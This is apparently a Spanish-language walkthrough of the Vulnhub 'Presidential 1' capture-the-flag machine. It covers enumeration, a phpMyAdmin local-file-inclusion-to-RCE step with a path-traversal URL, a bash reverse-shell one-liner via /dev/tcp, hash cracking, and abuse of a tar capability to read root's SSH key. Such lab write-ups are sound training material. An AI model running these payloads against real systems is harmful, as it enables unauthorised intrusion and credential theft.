#vulnhub #ctf-machine #medium-machine #linux [Vulnhub Link](https://www.vulnhub.com/entry/presidential-1,500/)
## Enumeración inicial
Primeramente hacemos un escaneo ARP con `arp-scan` para identificar la dirección IPv4 de nuestra máquina objetivo:
![[Pasted image 20240821110802.png]]

Una vez identificada la máquina enviamos con `ping` una traza ICMP para identificar provisionalmente el sistema operativo al que nos estamos enfrontando. Como el TTL = 64 podemos decir que se trata de una máquina Linux:
![[Pasted image 20240821110925.png]]


### Nmap
Hacemos un primer escaneo con `nmap` para detectar los puertos abiertos mediante el protocolo TCP que hay en la máquina:
![[Pasted image 20240821111134.png]]

Como podemos ver hay abiertos 2 puertos, el puerto 80 y 2082. Por lo tanto, hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren bajo estos 2 puertos:
![[Pasted image 20240821111435.png]]

Podemos confirmar entonces que se trata de un sistema Linux CentOS al parecer. Además, podemos ver que por el puerto 2082 se está ejecutando el servicio OpenSSH de versión 7.4 que es vulnerable a enumeración de usuarios:
![[Pasted image 20240821111628.png]]

Por último hacemos un escaneo último escaneo con `nmap` utilizando el script "http-enum" en busca de directorios bajo el protocolo HTTP del puerto 80:
![[Pasted image 20240821111900.png]]

Podemos ver que hay un directorio `/icons/` con capacidad de *directory listing*.

## Enumeración Web
Si hacemos un análisis con `whatweb` podemos ver 2 emails y que se utiliza una versión de PHP bastante antigua:
![[Pasted image 20240821112405.png]]

Si accedemos a la web podemos ver la página inicial:
![[Pasted image 20240821112611.png]]

Si abrimos el `wappalyzer` podemos confirmar que se trata de un CentOS y que utiliza la versión de PHP 5.5.38:
![[Pasted image 20240821112805.png]]

Si hacemos un escaneo con `wfuzz` de directorios encontramos los directorios "cgi-bin", "icons" y "assets":
![[Pasted image 20240821113840.png]]

Si ahora buscamos por archivos con extensión ".php" encontramos el archivo `/config.php`:
![[Pasted image 20240821114257.png]]

Si seguimos haciendo *fuzzing* de archivos con extensión ".html" encontramos el archivo `/about.html`:
![[Pasted image 20240821115029.png]]

Que al acceder a él simplemente vemos una plantilla no modificada expuesta:
![[Pasted image 20240821115117.png]]

Si buscamos subdominios con `gobuster` utilizando diversos diccionarios, finalmente encontramos este subdominio:
![[Pasted image 20240821121808.png]]

Si entramos a la página podemos ver que hay un panel de autentificación:
![[Pasted image 20240821122534.png]]


![[Pasted image 20240821122757.png]]

Si accedemos a `Changelog` podemos ver la versión que está corriendo de "phpmyadmin":
![[Pasted image 20240821123135.png]]

Que si buscamos sobre esta versión en `searchsploit` podemos ver que hay una vulnerabilidad LFI una vez autenticados:
![[Pasted image 20240821123302.png]]

Por lo que nos interesa buscar la forma de autentificarnos. Si seguimos haciendo enumeración de `votenow.local` con extensiones ".bak", etc. utilizando `gobuster` encontramos lo siguiente:
![[Pasted image 20240821125529.png]]

Si accedemos a él encontramos lo siguiente:
![[Pasted image 20240821125627.png]]

Así que sí intentamos acceder al "phpmyadmin" de `datasafe.votenow.local`, podemos acceder:
![[Pasted image 20240821130009.png]]

Como habíamos visto antes, para esta versión si estamos autentificados tenemos capacidad de un *Local File Inclusion* to *RCE* por lo que si leemos el PoC del *exploit* vemos que tenemos que crear un SQL query con código PHP para luego apuntar a un archivo de nuestra sesión de la máquina y que se interprete el código PHP.
![[Pasted image 20240821150752.png]]

Por lo tanto, primeramente creamos una query SQL con código PHP dentro de `server_sql.php`:
![[Pasted image 20240821152041.png]]

Una vez ejecutada la query, accedemos a nuestra sesión de la máquina utilizando esta url que contiene nuestra sesión:
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../../../../../var/lib/php/session/sess_oe3ugns174gnbcpt24844h6cn1j1bpfq

![[Pasted image 20240821152155.png]]

Y como podemos ver si concatenamos el parametro "cmd" en la url tenemos capacidad de ejecución de comandos:
![[Pasted image 20240821152350.png]]

Por lo que nos entablamos una reverse shell con el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.1.21/443 0>&1"
```
![[Pasted image 20240821152542.png]]

Seguidamente, hacemos el tratamiento de la TTY:
![[Pasted image 20240821152710.png]]
![[Pasted image 20240821152758.png]]

## Escalada de privilegios
Si accedemos a MySQL y sacamos todos los usuarios de la base de datos "votebox" podemos ver que hay un usuario admin con un *hash* que podemos intentar *crackear*:
![[Pasted image 20240821160021.png]]

Así que intentamos *crackear* el *hash* utilizando la herramienta `john` junto al `rockyou.txt`:
![[Pasted image 20240821164107.png]]

Así que intentamos emigrar al usuario "admin" con esta contraseña:
![[Pasted image 20240821162859.png]]

Si accedemos al `/home/admin` podemos visualizar la flag:
![[Pasted image 20240821162939.png]]

Además podemos visualizar un archivo  `notes.txt` donde pone lo siguiente:
![[Pasted image 20240821163215.png]]

Si listamos las *capabilities* vemos un binario tarS con permisos "cap_dac_read_search+ep":
![[Pasted image 20240821165241.png]]

La cual cosa nos puede permitir leer archivos de la máquina que en un principio no podemos. Por lo tanto podemos comprimir los archivos que deseamos leer y descomprimirlos. Utilizando `tarS` que es como `tar`. Así que si comprimimos el archivo `/root/.ssh/id_rsa`, podemos ver la clave privada del usuario root y obtener acceso a la máquina como root.
![[Pasted image 20240821170754.png]]

Así que desde nuestra máquina y con la clave privada en un archivo `id_rsa`, accedemos a la máquina como root:
![[Pasted image 20240821170849.png]]

Y desde el directorio `/root` visualizamos la última *flag*:
![[Pasted image 20240821170936.png]]

___
#web-enumeration #information-leakage #local-file-inclusion #hash-cracking #abusing-capabilities 
___